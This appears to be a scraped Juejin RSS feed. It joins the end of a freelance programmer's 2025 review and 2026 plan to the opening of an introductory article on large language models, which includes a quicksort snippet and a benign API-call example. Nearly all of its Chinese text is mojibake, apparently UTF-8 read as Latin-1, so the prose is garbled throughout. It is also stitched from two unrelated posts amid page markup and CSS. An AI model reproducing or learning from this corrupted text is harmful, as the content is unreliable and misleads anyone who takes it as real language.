<p>æˆ‘åœ¨åšçš„ï¼Œå…¶å®æ˜¯æŠŠæ—¶é—´ä»â€œçŸ­æœŸæ¢é’±â€ï¼Œæ…¢æ…¢è½¬å‘â€œé•¿æœŸèµ„äº§â€ã€‚</p>
<h2 data-id="heading-6">äº”ã€2025 å¹´æœ€å¤§çš„ç°å®é—®é¢˜ï¼šæ—¶é—´ä¸å¤Ÿç”¨</h2>
<p>å¦‚æœè¯´ 2025 å¹´æœ€å¤§çš„æŒ‘æˆ˜æ˜¯ä»€ä¹ˆï¼Œé‚£ä¸æ˜¯æ²¡æ–¹å‘ï¼Œè€Œæ˜¯ï¼š</p>
<blockquote>
<p><strong>æ–¹å‘å¤ªæ¸…æ™°ä¹‹åï¼Œæ—¶é—´å¼€å§‹ä¸¥é‡ä¸å¤Ÿç”¨ã€‚</strong></p>
</blockquote>
<p>çº¿ä¸Šå†…å®¹ã€çº¿ä¸‹äº‹åŠ¡ã€å…¬å¸æ¨è¿›ï¼Œå æ®äº†å¤§éƒ¨åˆ†ç²¾åŠ›ï¼Œå¯¼è‡´ä¸€äº›æˆ‘éå¸¸æƒ³åšã€ä¹Ÿéå¸¸é‡è¦çš„äº‹æƒ…è¢«åå¤æ¨è¿Ÿï¼Œæ¯”å¦‚ï¼š</p>
<ul>
<li>AI ç¼–ç¨‹</li>
<li>AI æ™ºèƒ½ä½“</li>
<li>äº§å“åŒ–ï¼ˆé£ä¹¦ä»˜è´¹æ‰‹å†Œï¼‰</li>
</ul>
<p>è¿™è®©æˆ‘æ„è¯†åˆ°ä¸€ä¸ªå…³é”®é—®é¢˜ï¼š</p>
<blockquote>
<p><strong>å­¦ä¹ ä¸èƒ½åªæ˜¯â€œé¢å¤–ä»»åŠ¡â€ï¼Œè€Œå¿…é¡»ç›´æ¥æœåŠ¡äºä¸šåŠ¡ææ•ˆã€‚</strong></p>
</blockquote>
<p>è¿™ä¹Ÿç›´æ¥å†³å®šäº†æˆ‘ 2026 å¹´çš„å­¦ä¹ æ–¹å‘ã€‚</p>
<h2 data-id="heading-7">å…­ã€è¿™ä¸€å¹´è¸©è¿‡çš„å‘</h2>
<p>å›çœ‹ 2025 å¹´ï¼Œæˆ‘è¸©è¿‡çš„å‘ä¸»è¦é›†ä¸­åœ¨ä¸‰ç‚¹ï¼š</p>
<ol>
<li><strong>æ—¶é—´ç¢ç‰‡åŒ–çš„è¯•é”™æœŸ</strong><br/>
å¤šé¡¹ç›®å¹¶è¡Œï¼Œçœ‹ä¼¼åŠªåŠ›ï¼Œå®åˆ™ç¨€é‡ŠåŠ¿èƒ½</li>
<li><strong>è¿‡åº¦ä¾èµ–äººåŠ›äº¤ä»˜</strong><br/>
äº§å“åŒ–æ¨è¿›ä¸å¤Ÿå¿«ï¼Œå½±å“é•¿æœŸå¤åˆ©</li>
<li><strong>é•¿æœŸå¿½è§†èº«ä½“ä¸ä½œæ¯</strong><br/>
ç†¬å¤œå’Œé«˜è´Ÿè·å¼€å§‹åå™¬æ•ˆç‡</li>
</ol>
<h2 data-id="heading-8">ä¸ƒã€2026å¹´è§„åˆ’ï¼šæŠŠç³»ç»Ÿæ­å®Œæ•´</h2>
<p>2026 å¹´ï¼Œæˆ‘ç»™è‡ªå·±çš„å”¯ä¸€ä¸»çº¿å¾ˆæ˜ç¡®ï¼š</p>
<blockquote>
<p><strong>æŠŠä¸ªäººèƒ½åŠ›ç³»ç»ŸåŒ–ã€äº§å“åŒ–ï¼Œå‡å°‘å¯¹â€œæˆ‘æœ¬äººåœ¨çº¿æ—¶é—´â€çš„ä¾èµ–ã€‚</strong></p>
</blockquote>
<p>å…·ä½“ä¼šèšç„¦åœ¨å‡ ä¸ªæ–¹å‘ï¼š</p>
<h4 data-id="heading-9">1. äº§å“å±‚ï¼ˆå¿…é¡»åšæˆï¼‰</h4>
<ul>
<li>é£ä¹¦ä»˜è´¹æ‰‹å†Œï¼šä½œä¸ºæ ¸å¿ƒæµé‡æ‰¿æ¥</li>
<li>å½•æ’­è¯¾ç¨‹ + ç›´æ’­ï¼šå–è‡ªå·±çš„çŸ¥è¯†äº§å“</li>
</ul>
<h4 data-id="heading-10">2. æœåŠ¡å±‚ï¼ˆæŒç»­æ·±åŒ–ï¼‰</h4>
<ul>
<li>æˆå“äº¤ä»˜ï¼ˆè§†é¢‘ / å›¾ç‰‡ï¼‰</li>
<li>ComfyUI å·¥ä½œæµå®šåˆ¶</li>
<li>è¡Œä¸šé•œåƒ / å·¥å…·æœåŠ¡ï¼ŒæŒ‰æœˆæˆ–æŒ‰å¹´è®¢é˜…</li>
</ul>
<h4 data-id="heading-11">3. èƒ½åŠ›å±‚ï¼ˆå¿…å­¦ï¼‰</h4>
<ul>
<li>AI ç¼–ç¨‹</li>
<li>AI æ™ºèƒ½ä½“<br/>
ç›®æ ‡ä¸æ˜¯è½¬å‹ï¼Œè€Œæ˜¯Â <strong>ææ•ˆ + å°è£… + äº§å“åŒ–</strong>ã€‚</li>
</ul>
<h4 data-id="heading-12">4. çº¿ä¸‹å…¬å¸</h4>
<ul>
<li>ç¨³å®šè¿è½¬</li>
<li>æ‰¿æ¥æ›´æˆç†Ÿçš„ä¼ä¸šé¡¹ç›®</li>
<li>ä¸è¿½æ±‚çˆ†å‘ï¼Œä½†è¿½æ±‚é•¿æœŸå¯æŒç»­</li>
</ul>
<h2 data-id="heading-13">å†™åœ¨æœ€å</h2>
<p>å›çœ‹ 2025 å¹´ï¼Œæˆ‘æœ€å¤§çš„æ”¶è·ä¸æ˜¯æŸä¸ªå…·ä½“æˆç»©ï¼Œè€Œæ˜¯ç»ˆäºæ¸…æ¥šåœ°çŸ¥é“ï¼š</p>
<blockquote>
<p><strong>æˆ‘åœ¨æ­ä¸€å¥—ä»€ä¹ˆæ ·çš„ç³»ç»Ÿï¼Œé€šå‘å“ªé‡Œã€‚</strong></p>
</blockquote>
<p>2026 å¹´ï¼Œæˆ‘ä¸ä¼šå†é¢‘ç¹è¯•é”™ï¼Œè€Œæ˜¯å›´ç»•å·²ç»éªŒè¯è¿‡çš„æ–¹å‘ï¼ŒæŠŠè¿™å¥—ç³»ç»Ÿä¸€å—ä¸€å—æ­å®Œæ•´ã€‚</p>
<p>æ…¢ä¸€ç‚¹ï¼Œä½†æ›´ç¨³ã€‚</p>
<p>ä¸Šé¢ç®—æ˜¯æˆ‘è¿™ä¸€å¹´çš„æ€»ç»“ï¼Œæˆ‘åˆ†äº«å‡ºæ¥ä¹Ÿæ˜¯ç»™å¤§å®¶å¯ä»¥è¿‘è·ç¦»çœ‹çœ‹ä¸€ä¸ªç¦»èŒçš„ç¨‹åºå‘˜çš„æ—¥å¸¸ï¼Œæœ‰åšçš„ä¸å¥½çš„åœ°æ–¹ä¹Ÿæœ‰åšçš„å¯å–çš„åœ°æ–¹ï¼Œæˆ‘ä¹Ÿæ˜¯ä¸ªæ™®é€šäººï¼Œä¸€ç›´åœ¨å°è¯•å’ŒåŠªåŠ›ï¼Œæ¬¢è¿æ¥äº¤æµï¼Œå¸Œæœ›2026å¹´å‘å±•çš„æ›´å¥½ã€‚</p>
<p>æˆ‘æ˜¯å˜Ÿå˜Ÿï¼Œä¸€ä¸ª12å¹´å…¨æ ˆç¨‹åºå‘˜ï¼Œç°åœ¨ç¦»èŒåˆ›ä¸šï¼Œéœ€è¦ä½ çš„ä¸‰è¿~</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ä»€ä¹ˆæ˜¯å¤§è¯­è¨€æ¨¡å‹-00]]></title>    <link>https://juejin.cn/post/7600976289064042496</link>    <guid>https://juejin.cn/post/7600976289064042496</guid>    <pubDate>2026-01-30T14:56:27.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7600976289064042496" data-draft-id="7600976289064026112" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ä»€ä¹ˆæ˜¯å¤§è¯­è¨€æ¨¡å‹-00"/> <meta itemprop="keywords" content="å‰ç«¯"/> <meta itemprop="datePublished" content="2026-01-30T14:56:27.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ä¸€è¯ºæ»šé›ªçƒ"/> <meta itemprop="url" content="https://juejin.cn/user/2824015112318094"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ä»€ä¹ˆæ˜¯å¤§è¯­è¨€æ¨¡å‹-00
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2824015112318094/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ä¸€è¯ºæ»šé›ªçƒ
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-30T14:56:27.000Z" title="Fri Jan 30 2026 14:56:27 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-30
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    1
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»4åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">å‰è¨€</h2>
<p>ä½ æœ‰æ²¡æœ‰æƒ³è¿‡ï¼Œå½“ä½ é—® ChatGPT ä¸€ä¸ªé—®é¢˜æ—¶ï¼Œå®ƒæ˜¯å¦‚ä½•"æ€è€ƒ"å¹¶ç»™å‡ºå›ç­”çš„ï¼Ÿ</p>
<p>ä»Šå¤©å¤©æ°”æ€ä¹ˆæ ·ï¼Ÿâ€”â€”æŠ±æ­‰ï¼Œæˆ‘æ— æ³•è·å–å®æ—¶å¤©æ°”ä¿¡æ¯ã€‚
è¯·ç”¨ JavaScript å†™ä¸€ä¸ªå¿«é€Ÿæ’åºâ€”â€”å‡ ç§’é’Ÿå†…ï¼Œä»£ç å°±å‡ºç°åœ¨å±å¹•ä¸Šã€‚</p>
<p>åŒæ ·æ˜¯ AIï¼Œä¸ºä»€ä¹ˆèƒ½å†™ä»£ç å´ä¸èƒ½æŸ¥å¤©æ°”ï¼Ÿå¤§è¯­è¨€æ¨¡å‹çš„"çŸ¥è¯†"ä»å“ªé‡Œæ¥ï¼Ÿå®ƒæ˜¯çœŸçš„"ç†è§£"æˆ‘ä»¬çš„è¯å—ï¼Ÿ</p>
<p>è¿™äº›é—®é¢˜ï¼Œæ­£æ˜¯æˆ‘ä»¬æ¢ç´¢å¤§è¯­è¨€æ¨¡å‹ï¼ˆLarge Language Modelï¼ŒLLMï¼‰ä¸–ç•Œçš„èµ·ç‚¹ã€‚</p>
<hr/>
<h2 data-id="heading-1">1. ä»€ä¹ˆæ˜¯å¤§è¯­è¨€æ¨¡å‹</h2>
<p><strong>å¤§è¯­è¨€æ¨¡å‹ï¼ˆLLMï¼‰</strong> æ˜¯ä¸€ç§ç»è¿‡æµ·é‡æ–‡æœ¬æ•°æ®è®­ç»ƒçš„æ·±åº¦å­¦ä¹ æ¨¡å‹ï¼Œèƒ½å¤Ÿç†è§£å’Œç”Ÿæˆäººç±»è¯­è¨€ã€‚</p>
<h3 data-id="heading-2">å…³é”®ç‰¹å¾</h3>

























<table><thead><tr><th>ç‰¹å¾</th><th>è¯´æ˜</th><th>ä¾‹å­</th></tr></thead><tbody><tr><td><strong>å¤§è§„æ¨¡è®­ç»ƒ</strong></td><td>ä½¿ç”¨ TB çº§æ–‡æœ¬æ•°æ®</td><td>GPT-4 è®­ç»ƒäº†çº¦ 1 ä¸‡äº¿ tokens</td></tr><tr><td><strong>æ·±åº¦ç¥ç»ç½‘ç»œ</strong></td><td>æ•°åäº¿åˆ°æ•°ä¸‡äº¿å‚æ•°</td><td>GPT-3 æœ‰ 1750 äº¿å‚æ•°</td></tr><tr><td><strong>é€šç”¨èƒ½åŠ›</strong></td><td>ä¸éœ€è¦ä¸“é—¨è®­ç»ƒå°±èƒ½å®Œæˆå¤šç§ä»»åŠ¡</td><td>ç¿»è¯‘ã€å†™ä½œã€ç¼–ç¨‹ã€æ¨ç†</td></tr></tbody></table>
<h3 data-id="heading-3">é€šä¿—ç†è§£</h3>
<p>æƒ³è±¡ä¸€ä¸‹ï¼š</p>
<ul>
<li>ä½ é˜…è¯»äº†äº’è”ç½‘ä¸Šå‡ ä¹æ‰€æœ‰çš„æ–‡æœ¬</li>
<li>ä½ è®°ä½äº†å…¶ä¸­çš„æ¨¡å¼ã€è§„å¾‹å’ŒçŸ¥è¯†</li>
<li>å½“æœ‰äººé—®ä½ é—®é¢˜æ—¶ï¼Œä½ èƒ½æ ¹æ®è®°å¿†ç”Ÿæˆå›ç­”</li>
</ul>
<p>è¿™å°±æ˜¯å¤§è¯­è¨€æ¨¡å‹åšçš„äº‹æƒ…ï¼</p>
<h3 data-id="heading-4">æ ¸å¿ƒå·¥ä½œåŸç†</h3>
<p>LLM çš„æœ¬è´¨æ˜¯ä¸€ä¸ª<strong>æ–‡å­—æ¥é¾™æœºå™¨</strong>ï¼š</p>
<pre><code class="hljs language-matlab" lang="matlab">è¾“å…¥: <span class="hljs-string">"ä»Šå¤©å¤©æ°”"</span>
LLM é¢„æµ‹ä¸‹ä¸€ä¸ªè¯å¯èƒ½æ˜¯:
- <span class="hljs-string">"çœŸå¥½"</span>    (æ¦‚ç‡ <span class="hljs-number">30</span><span class="hljs-comment">%)</span>
- <span class="hljs-string">"å¾ˆçƒ­"</span>    (æ¦‚ç‡ <span class="hljs-number">25</span><span class="hljs-comment">%)</span>
- <span class="hljs-string">"æ€ä¹ˆæ ·"</span>  (æ¦‚ç‡ <span class="hljs-number">20</span><span class="hljs-comment">%)</span>
</code></pre>
<p><strong>è®­ç»ƒæµç¨‹</strong>ï¼š</p>
<pre><code class="hljs">â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚            LLM è®­ç»ƒæµç¨‹                   â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚                                         â”‚
â”‚  1. æ•°æ®æ”¶é›†                             â”‚
â”‚     â”œâ”€â”€ ç½‘é¡µæ–‡æœ¬                         â”‚
â”‚     â”œâ”€â”€ ä¹¦ç±æ–‡ç«                          â”‚
â”‚     â””â”€â”€ ä»£ç åº“                           â”‚
â”‚                                         â”‚
â”‚  2. é¢„è®­ç»ƒ                               â”‚
â”‚     â”œâ”€â”€ å­¦ä¹ è¯­è¨€æ¨¡å¼                     â”‚
â”‚     â”œâ”€â”€ å­¦ä¹ ä¸–ç•ŒçŸ¥è¯†                     â”‚
â”‚     â””â”€â”€ å­¦ä¹ é€»è¾‘æ¨ç†                     â”‚
â”‚                                         â”‚
â”‚  3. å¾®è°ƒ                                 â”‚
â”‚     â”œâ”€â”€ å¯¹é½äººç±»åå¥½                     â”‚
â”‚     â”œâ”€â”€ éµå¾ªæŒ‡ä»¤                         â”‚
â”‚     â””â”€â”€ å®‰å…¨æ€§è®­ç»ƒ                       â”‚
â”‚                                         â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
</code></pre>
<h3 data-id="heading-5">å››å¤§æ ¸å¿ƒèƒ½åŠ›</h3>
<p><strong>1. è¯­è¨€ç†è§£</strong></p>
<ul>
<li>ç†è§£æ–‡æœ¬å«ä¹‰</li>
<li>è¯†åˆ«æƒ…æ„Ÿå€¾å‘</li>
<li>æå–å…³é”®ä¿¡æ¯</li>
</ul>
<p><strong>2. è¯­è¨€ç”Ÿæˆ</strong></p>
<ul>
<li>å†™æ–‡ç« ã€å†™ä»£ç </li>
<li>åˆ›æ„å†™ä½œ</li>
<li>æ€»ç»“æç‚¼</li>
</ul>
<p><strong>3. é€»è¾‘æ¨ç†</strong></p>
<ul>
<li>æ•°å­¦è®¡ç®—</li>
<li>é€»è¾‘æ¨ç†</li>
<li>é—®é¢˜è§£å†³</li>
</ul>
<p><strong>4. å°‘æ ·æœ¬å­¦ä¹ </strong></p>
<ul>
<li>çœ‹å‡ ä¸ªä¾‹å­å°±èƒ½å­¦ä¼šæ–°ä»»åŠ¡</li>
<li>ä¸éœ€è¦é‡æ–°è®­ç»ƒ</li>
</ul>
<hr/>
<h2 data-id="heading-6">2. æ¡ˆä¾‹</h2>
<h3 data-id="heading-7">æ¡ˆä¾‹ 1ï¼šå°‘æ ·æœ¬å­¦ä¹ çš„ç¥å¥‡ä¹‹å¤„</h3>
<p>è®©æˆ‘ä»¬çœ‹çœ‹ LLM å¦‚ä½•é€šè¿‡å‡ ä¸ªä¾‹å­å­¦ä¼šæ–°ä»»åŠ¡ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> prompt = <span class="hljs-string">`
ä¾‹å­1ï¼š
è¾“å…¥ï¼šè‹¹æœ
è¾“å‡ºï¼šæ°´æœ

ä¾‹å­2ï¼š
è¾“å…¥ï¼šèƒ¡èåœ
è¾“å‡ºï¼šè”¬èœ

è¾“å…¥ï¼šé¦™è•‰
è¾“å‡ºï¼šï¼Ÿ
`</span>;
<span class="hljs-comment">// LLM èƒ½æ¨æ–­ï¼šé¦™è•‰ â†’ æ°´æœ</span>
</code></pre>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d2b6a30f81de4e989380d4c407bd6893~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiA6K-65rua6Zuq55CD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770389789&amp;x-signature=aOmds6PQEGJJhLVF23Ta9w8%2FBX0%3D" alt="image.png" loading="lazy"/></p>
<p><strong>è§£æ</strong>ï¼šæ— éœ€é‡æ–°è®­ç»ƒï¼Œåªéœ€å‡ ä¸ªç¤ºä¾‹ï¼ŒLLM å°±èƒ½ç†è§£åˆ†ç±»è§„å¾‹å¹¶åº”ç”¨åˆ°æ–°é—®é¢˜ã€‚</p>
<h3 data-id="heading-8">æ¡ˆä¾‹ 2ï¼šä»£ç ç”Ÿæˆèƒ½åŠ›</h3>
<p><strong>è¾“å…¥</strong>ï¼š"è¯·ç”¨ JavaScript å†™ä¸€ä¸ªå¿«é€Ÿæ’åº"</p>
<p><strong>LLM è¾“å‡º</strong>ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">quickSort</span>(<span class="hljs-params">arr</span>) {
  <span class="hljs-keyword">if</span> (arr.<span class="hljs-property">length</span> &lt;= <span class="hljs-number">1</span>) {
    <span class="hljs-keyword">return</span> arr;
  }
  <span class="hljs-keyword">const</span> pivot = arr[<span class="hljs-title class_">Math</span>.<span class="hljs-title function_">floor</span>(arr.<span class="hljs-property">length</span> / <span class="hljs-number">2</span>)];
  <span class="hljs-keyword">const</span> left = arr.<span class="hljs-title function_">filter</span>(<span class="hljs-function"><span class="hljs-params">x</span> =&gt;</span> x &lt; pivot);
  <span class="hljs-keyword">const</span> middle = arr.<span class="hljs-title function_">filter</span>(<span class="hljs-function"><span class="hljs-params">x</span> =&gt;</span> x === pivot);
  <span class="hljs-keyword">const</span> right = arr.<span class="hljs-title function_">filter</span>(<span class="hljs-function"><span class="hljs-params">x</span> =&gt;</span> x &gt; pivot);
  <span class="hljs-keyword">return</span> [...<span class="hljs-title function_">quickSort</span>(left), ...middle, ...<span class="hljs-title function_">quickSort</span>(right)];
}
</code></pre>
<p><strong>è§£æ</strong>ï¼šLLM ä»è®­ç»ƒæ•°æ®ä¸­å­¦ä¼šäº†ç¼–ç¨‹æ¨¡å¼å’Œç®—æ³•é€»è¾‘ï¼Œèƒ½å¤Ÿç”Ÿæˆå¯è¿è¡Œçš„ä»£ç ã€‚</p>
<h3 data-id="heading-9">æ¡ˆä¾‹ 3ï¼šå‘ç° LLM çš„å±€é™æ€§</h3>
<p><strong>æµ‹è¯• 1ï¼šå®æ—¶ä¿¡æ¯</strong></p>
<pre><code class="hljs language-vbnet" lang="vbnet">ç”¨æˆ·: <span class="hljs-string">"ä»Šå¤©å¤©æ°”æ€ä¹ˆæ ·ï¼Ÿ"</span>
<span class="hljs-symbol">LLM:</span> <span class="hljs-string">"æŠ±æ­‰ï¼Œæˆ‘æ— æ³•è·å–å®æ—¶å¤©æ°”ä¿¡æ¯ã€‚"</span>
</code></pre>
<p><strong>æµ‹è¯• 2ï¼šç²¾ç¡®è®¡ç®—</strong></p>
<pre><code class="hljs language-makefile" lang="makefile"><span class="hljs-section">ç”¨æˆ·: "12345 Ã— 67890 = ï¼Ÿ"</span>
<span class="hljs-section">LLM: "å¤§çº¦æ˜¯ 83,000,000 å·¦å³"</span>
<span class="hljs-section">å®é™…: 838,102,050</span>
</code></pre>
<p><strong>æµ‹è¯• 3ï¼šçŸ¥è¯†æˆªæ­¢</strong></p>
<pre><code class="hljs language-vbnet" lang="vbnet">ç”¨æˆ·: <span class="hljs-string">"è°èµ¢å¾—äº†2024å¹´å¥¥è¿ä¼šï¼Ÿ"</span>
<span class="hljs-symbol">LLM:</span> <span class="hljs-string">"æŠ±æ­‰ï¼Œæˆ‘çš„çŸ¥è¯†æˆªæ­¢åˆ°2023å¹´..."</span>
</code></pre>
<p><strong>è§£æ</strong>ï¼šè¿™äº›æµ‹è¯•æ­ç¤ºäº† LLM çš„ä¸‰å¤§å±€é™â€”â€”çŸ¥è¯†æˆªæ­¢ã€å¹»è§‰é—®é¢˜ã€æ— æ³•è®¿é—®å®æ—¶ä¿¡æ¯ã€‚</p>
<h3 data-id="heading-10">æ¡ˆä¾‹ 4ï¼šå®é™…é¡¹ç›®ä¸­çš„è°ƒç”¨</h3>
<p>åœ¨æœ¬é¡¹ç›®çš„åç«¯ä»£ç ä¸­ï¼ŒLLM è°ƒç”¨æ˜¯è¿™æ ·å®ç°çš„ï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">async</span> <span class="hljs-title function_">chat</span>(<span class="hljs-params">request: {
  question: <span class="hljs-built_in">string</span>;    // ç”¨æˆ·çš„é—®é¢˜
  model: <span class="hljs-built_in">string</span>;       // ä½¿ç”¨çš„æ¨¡å‹ï¼ˆå¦‚ qwen-plusï¼‰
  apiKey: <span class="hljs-built_in">string</span>;      // API å¯†é’¥
}</span>) {
  <span class="hljs-comment">// è°ƒç”¨é˜¿é‡Œäº‘ç™¾ç‚¼çš„ LLM</span>
  <span class="hljs-keyword">const</span> response = <span class="hljs-keyword">await</span> axios.<span class="hljs-title function_">post</span>(
    <span class="hljs-string">'https://dashscope.aliyuncs.com/compatible-mode/v1/chat/completions'</span>,
    {
      <span class="hljs-attr">model</span>: request.<span class="hljs-property">model</span>,
      <span class="hljs-attr">messages</span>: [{ <span class="hljs-attr">role</span>: <span class="hljs-string">'user'</span>, <span class="hljs-attr">content</span>: request.<span class="hljs-property">question</span> }]
    }
  );

  <span class="hljs-keyword">return</span> response.<span class="hljs-property">data</span>.<span class="hljs-property">choices</span>[<span class="hljs-number">0</span>].<span class="hljs-property">message</span>.<span class="hljs-property">content</span>;
}
</code></pre>
<p><strong>è§£æ</strong>ï¼šé€šè¿‡ HTTP API è°ƒç”¨ï¼Œå°†ç”¨æˆ·é—®é¢˜å‘é€ç»™ LLMï¼Œè·å–ç”Ÿæˆçš„å›å¤ã€‚</p>
<hr/>
<h2 data-id="heading-11">æ€»ç»“</h2>
<ol>
